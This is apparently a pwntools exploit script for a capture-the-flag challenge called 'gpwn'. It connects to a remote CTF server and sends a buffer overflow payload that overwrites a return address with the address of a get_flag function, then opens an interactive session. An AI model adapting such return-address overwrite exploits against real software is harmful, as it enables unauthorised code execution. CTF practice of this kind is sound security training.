from pwn import *

#context.arch = 'i386'
#context.terminal=['tmux', 'splitw', '-h']
#p = process("./gpwn")
p = remote('ctf.j0n9hyun.xyz', 3011)
get_flag = 0x8048f0d
#gdb.attach(p, 'b*0x04009c9')


payload = ''
payload += "A"
payload += "I"*21
payload += p32(get_flag)

p.sendline(payload)
p.interactive()